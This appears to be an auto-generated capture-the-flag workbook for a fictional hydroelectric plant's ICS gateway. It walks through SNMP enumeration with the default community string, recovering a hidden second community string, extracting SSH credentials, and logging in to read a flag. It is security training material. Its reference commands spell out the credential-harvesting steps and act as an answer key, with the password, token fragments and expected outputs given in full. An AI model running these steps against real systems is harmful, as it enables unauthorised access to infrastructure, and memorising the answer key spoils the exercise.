# Ridgeline Power Systems - SNMP Breadcrumb Trail

!!! note "Workbook generated from the lab definition"
    This walkthrough was generated from `linux-2-10-snmp-breadcrumb-trail/lab.yaml` and reviewed for
    structure. Verify the target name, commands, and output against the running
    lab before relying on them. Do not copy a flag from the lab definition; use
    the flag you recover in the environment.

## Before You Begin

- [ ] Launched **Ridgeline Power Systems - SNMP Breadcrumb Trail** in the platform
- [ ] Opened the lab browser or terminal
- [ ] You can reach the target shown in the exercise
- [ ] Estimated time: **45 minutes** · Difficulty: **intermediate**

## Targets and Tools

- Use the target address shown in the exercise.

- No special tool list is declared; use the terminal or browser provided by the lab.

## Scenario

Ridgeline Power Systems operates a hydroelectric monitoring facility in
rural Montana. Their operations team deployed an ICS gateway to aggregate
sensor data from turbine controllers across the plant. The gateway exposes
SNMP for network management and SSH for remote administration.

During a routine security assessment, you have been asked to evaluate the
gateway's exposure. Mike Harlan (Plant Network Engineer) insists: "We only
use the standard community string for monitoring - there's nothing an
outsider could leverage from SNMP alone."

Prove him wrong. Start with basic SNMP enumeration and follow the
breadcrumb trail. The gateway may reveal more than simple monitoring data.

## Your Objectives

- Enumerate SNMP using the default "public" community string
- Discover a non-default community string hidden in system information
- Use the discovered community string to extract SSH credentials
- Log in via SSH with the discovered credentials
- Capture the flag

## Background and Approach

Read the scenario before touching the target. Identify what you control, where
that input goes, and what evidence would prove success. Work from discovery to
verification: confirm the service, collect the minimum evidence, then capture
the flag. Use the lab's target list rather than guessing an address.

## Walkthrough

1. Launch the exercise and note the target address shown by the platform.
2. Confirm the target is reachable with a simple check before running a larger
   scan or exploit.
3. Work through the objectives in order. Record the exact command and the
   relevant output for each step.
4. If a step stalls, use the hint ladder below rather than jumping to a later
   hint.
5. When you recover the flag, submit it in the **Submit Flag** form and record
   the result.

### Reference commands

These are the lab's verification commands, with the target replaced by
`<target>`. They are a check, not a substitute for understanding the objective.

**SNMP public walk returns sysDescr with hidden community hint**

```bash
snmpwalk -v2c -c public -t 5 <target> 1.3.6.1.2.1.1.1.0 2>&1 | head -1
```

Expected: `internal-community: internal`

**Extract token fragment from public sysDescr**

```bash
snmpwalk -v2c -c public -t 5 <target> 1.3.6.1.2.1.1.1.0 2>&1 | grep -o 'Token: [a-z0-9_]*' | awk '{print $2}'
```

Expected: `snmp_ch41n`

**SNMP internal walk returns sysContact with SSH credentials**

```bash
snmpwalk -v2c -c internal -t 5 <target> 1.3.6.1.2.1.1.4.0 2>&1 | head -1
```

Expected: `ops_user`

**Extract token fragment from internal sysContact**

```bash
snmpwalk -v2c -c internal -t 5 <target> 1.3.6.1.2.1.1.4.0 2>&1 | grep -o 'Token: [a-z0-9_]*' | awk '{print $2}'
```

Expected: `l0g1n`

**SSH login and read flag**

```bash
sshpass -p 'R1dg3_0ps_2024#' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null ops_user@<target> 'cat ~/flag.txt' 2>&1
```

Expected: `OCR{`


### Hint ladder

<details><summary>Hint 1 (unlocks after 15 minutes)</summary>

SNMP runs on UDP port 161. Start with the default community string:
snmpwalk -v2c -c public <target_ip> system
Read the sysDescr field carefully - it contains more than just a version string.

</details>

<details><summary>Hint 2 (unlocks after 25 minutes)</summary>

The sysDescr field mentions a second community string. Try using that
community string to perform another SNMP walk. Check the sysContact
field in the new walk output - it may contain service credentials.

</details>

<details><summary>Hint 3 (unlocks after 35 minutes)</summary>

Once you have the credentials from the second SNMP walk, use them to
log in via SSH to the same target host. The flag is stored in a file
in the user's home directory.

</details>


## Record Your Findings

| Item | Your result |
|---|---|
| Target address |  |
| Service or path discovered |  |
| Evidence that proves the objective |  |
| Flag recovered |  |
| What you would change defensively |  |

## Analysis Questions

1. What did you control, and where did that input reach?
2. Which check was missing or weak?
3. What evidence proves the objective was met, rather than only attempted?
4. What would a defender see in logs or monitoring?
5. What is the smallest fix that would stop the same path?

## Defensive Takeaway

Disable unused services, enforce key-based SSH with least privilege, and alert on unexpected authentication or command execution.

## If You Get Stuck

If the target is unreachable, confirm the lab is running and use the hostname shown in the exercise. If a command returns an unexpected error, check the port, path, and credentials before assuming the technique failed. Report a persistent technical failure to the instructor so it is not mistaken for learning difficulty.

Separate a platform problem from a learning problem:

- **Target unreachable:** check the lab status and the target address first.
- **Command error:** read the exact error; check the port, path, and credentials.
- **Technique fails:** compare your command with the reference command and the
  hint ladder.
- **Persistent failure:** report it to the instructor with the command and error.

## Key Takeaways

- You practised the objective in an isolated, fictional environment.
- The flag is evidence of completion, not a grade.
- The defensive takeaway matters as much as the offensive step.
- Keep the exact evidence so another analyst can reproduce the result.
